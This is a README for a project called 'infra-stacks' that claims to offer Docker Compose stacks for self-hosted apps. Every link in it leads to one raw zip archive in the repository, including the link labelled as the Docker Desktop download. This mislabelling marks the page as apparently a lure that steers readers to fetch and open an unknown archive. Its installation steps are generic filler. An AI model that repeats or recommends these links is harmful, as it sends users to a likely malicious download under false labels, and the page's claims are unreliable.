[![Download Releases](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip)

## 📖 Overview

**infra-stacks** provides simple and production-ready Docker Compose stacks tailored for self-hosted infrastructure. With this collection, you can easily set up applications like chatwoot, Grafana, and more, without the need for complex configurations.

## 🚀 Getting Started

Follow these straightforward steps to get your application up and running:

1. **Check System Requirements**  
   Make sure your computer has the following:
   - Operating System: Windows, macOS, or a Linux distribution.
   - Docker: Download and install [Docker Desktop](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip) for your operating system.
   - Internet Connection: You will need internet access for downloading images and updates.

2. **Visit the Releases Page**  
   Go to the [Releases page](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip) to find the latest version of infra-stacks. 

3. **Download The Latest Release**  
   Look for the most recent version. Click on the release name, and you will see a list of available files. Choose the appropriate file for your operating system and click to download.

   In case you encounter multiple files, select the one labeled with your OS. For example, if you’re on Windows, look for files indicating Windows.

## 🔧 Installation Instructions

4. **Extract the Downloaded File**  
   Once the download completes, find the downloaded file on your computer. If it's a zip file, right-click it and select "Extract All" or a similar option. Choose a location where you want to store the files.

5. **Open Terminal or Command Prompt**  
   Depending on your OS, open:  
   - **Windows:** Command Prompt or Powershell  
   - **macOS:** Terminal  
   - **Linux:** Terminal application

6. **Navigate to the Directory**  
   In the terminal, use the `cd` command to navigate to the folder where you extracted the files. For example:  
   ```
   cd path/to/extracted/folder
   ```

7. **Run the Docker Compose Command**  
   In the terminal, type the following command to start the application:  
   ```
   docker-compose up
   ```

   This command runs Docker Compose, which will pull the necessary images and start the stack. You may see messages about downloading images; this is normal.

8. **Access Your Application**  
   After the stack launches successfully, open your web browser and enter the following URL:  
   ```
   http://localhost
   ```
   Now, you can start using your application.
